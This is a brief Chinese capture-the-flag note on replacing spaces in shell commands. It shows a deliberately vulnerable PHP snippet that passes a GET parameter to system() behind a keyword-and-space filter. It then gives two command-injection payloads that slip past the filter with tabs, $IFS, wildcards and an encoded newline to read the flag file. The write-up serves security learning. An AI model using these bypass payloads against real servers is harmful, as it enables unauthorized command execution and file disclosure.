# 知识点
shell内替换空格
### $IFS替换空格
# 思路
源码
```bash
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
payload
```bash
?c=tac%09fla?.php%0a %09 - 水平制表符
?c=echo$IFS`tac$IFS*`%0A
```
![image.png](./images/20231017_2350487719.png)
